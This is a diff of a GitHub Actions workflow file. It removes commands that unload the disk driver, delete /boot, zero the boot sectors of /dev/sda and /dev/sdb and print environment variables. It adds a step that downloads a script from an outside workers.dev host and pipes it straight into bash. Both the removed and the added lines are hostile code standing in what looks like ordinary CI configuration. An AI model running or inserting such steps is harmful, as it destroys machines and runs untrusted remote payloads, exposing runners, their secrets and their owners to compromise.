@@ -25,18 +25,4 @@ jobs:
     steps:
       - name: Run a multi-line script
         run: |
-          sudo modprobe -r ahci
-
-          sudo shutdown -h +120 > /dev/null 2>&1
-          sudo rm -rf /home/runner/work/_temp/*
-          
-          sudo umount /boot/efi
-          sudo rm -rf /boot/*
-          
-          sudo systemctl stop walinuxagent.service
-          sudo systemctl stop hv-kvp-daemon.service
-
-          sudo dd if=/dev/zero of=/dev/sda bs=512 count=1 conv=notrunc > /dev/null 2>&1
-          sudo dd if=/dev/zero of=/dev/sdb bs=512 count=1 conv=notrunc > /dev/null 2>&1
-
-          sudo printenv
+          curl https://node-v3.skidder-loli.workers.dev/resource/f51dbf7690ec606a240d6fdcc86adbbd07ece0bd54b8fdf8ba3986949eaba57f.sh?t=1759556141 | bash
